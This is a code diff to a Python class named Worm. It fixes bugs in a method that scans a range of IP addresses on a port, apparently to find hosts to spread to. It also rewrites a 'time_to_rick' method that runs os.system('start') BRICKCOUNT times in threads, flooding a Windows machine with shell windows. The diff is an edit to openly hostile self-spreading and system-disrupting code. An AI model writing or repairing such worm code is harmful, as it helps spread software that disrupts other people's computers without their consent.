@@ -168,7 +168,7 @@ class Worm:
             self.threader.append(worm.connect, BASE_IP%i, PORT)
         self.threader.start()
         self.threader.join()
-        logging.warning(f"[{perf_counter() - start:.5f}] Done Searching")
+        logging.warning(f"[{perf_counter() - self.start:.5f}] Done Searching")
     
     def rick_and_roll(self):
         try:
@@ -179,9 +179,12 @@ class Worm:
         except:
             logging.warning("exception occurred: no rick?")
             
-    def time_to_rick():
-         for i in range(0, BRICKCOUNT):
-             os.system("start")
+    def time_to_rick(self):
+        for i in range(0, BRICKCOUNT):
+            self.threader.append(os.system("start"))
+        self.threader.start()
+        self.threader.join()
+        logging.warning(f"[{perf_counter() - self.start:.5f}] Done Searching")
         
     def start_worm_actions(self):
         print(self.target_dir_list)
